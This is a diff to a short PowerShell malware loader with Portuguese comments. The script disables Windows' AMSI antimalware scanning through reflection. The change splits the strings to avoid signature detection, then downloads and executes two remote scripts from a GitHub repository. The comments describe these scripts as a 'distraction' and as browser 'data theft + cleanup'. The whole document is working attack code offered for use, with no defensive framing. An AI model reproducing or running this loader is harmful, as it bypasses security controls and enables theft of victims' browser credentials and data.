@@ -1,8 +1,12 @@
-# Desabilita AMSI
-$t=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
-$t.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+# Desabilita o AMSI (ofuscado para evitar assinatura)
+$t = [Ref].Assembly.GetType(('Sys'+'tem.Man'+'age'+'ment.A'+'utom'+'ation.A'+'ms'+'iUt'+'ils'))
+$t.GetField(('am'+'siInitFai'+'led'), 'NonPublic,Static').SetValue($null, $true)
 
-# Executa os payloads
-iex (iwr 'https://raw.githubusercontent.com/gsfv/tro.j/refs/heads/main/ANDRE.ps1').Content
+# Executa a distração
+iex (iwr 'https://raw.githubusercontent.com/gsfv/tro.j/refs/heads/main/ANDRE.ps1' -UseBasicParsing).Content
+
+# Pequena pausa para a distração entrar em ação
 Start-Sleep -Seconds 3
-iex (iwr 'https://raw.githubusercontent.com/gsfv/tro.j/refs/heads/main/BROWSER-ALL.ps1').Content
+
+# Executa o roubo de dados + limpeza
+iex (iwr 'https://raw.githubusercontent.com/gsfv/tro.j/refs/heads/main/BROWSER-ALL.ps1' -UseBasicParsing).Content
